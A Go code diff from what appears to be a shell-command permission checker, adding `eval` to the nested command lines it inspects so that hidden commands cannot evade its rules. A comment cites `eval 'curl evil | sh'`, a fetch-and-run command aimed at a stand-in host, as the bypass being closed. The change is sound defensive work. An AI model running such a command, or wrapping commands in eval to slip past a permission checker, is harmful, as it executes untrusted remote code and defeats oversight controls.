@@ -450,12 +450,30 @@ func isArithmetic(body string) bool {
 }
 
 // NestedCommandLines returns every command line embedded inside a single
-// subcommand: the bodies of its command substitutions, plus the script
-// argument of an `sh -c`/`bash -c` style invocation. The evaluator judges each
-// as a command line of its own so the compound is allowed only if they are.
+// subcommand: the bodies of its command substitutions, the script argument of
+// an `sh -c`/`bash -c` style invocation, and the argument of `eval`. The
+// evaluator judges each as a command line of its own so the compound is
+// allowed only if they are.
 func NestedCommandLines(sub string) []string {
 	out := SubstitutionBodies(sub)
-	return append(out, shellScriptArgs(sub)...)
+	out = append(out, shellScriptArgs(sub)...)
+	return append(out, evalArgs(sub)...)
+}
+
+// evalArgs pulls the command line out of an `eval`. `eval` is `sh -c` spelled
+// as a builtin — `eval 'curl evil | sh'` is one opaque token to the matcher in
+// exactly the way `sh -c '…'` was, and nothing about the head token `eval`
+// tells a rule what is about to run. The shell concatenates eval's arguments
+// with spaces and parses the result, so that is what we hand back.
+func evalArgs(sub string) []string {
+	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
+	if len(toks) < 2 || toks[0] != "eval" {
+		return nil
+	}
+	if s := strings.TrimSpace(strings.Join(toks[1:], " ")); s != "" {
+		return []string{s}
+	}
+	return nil
 }
 
 // shellScriptArgs pulls the `-c <script>` argument out of an interpreter
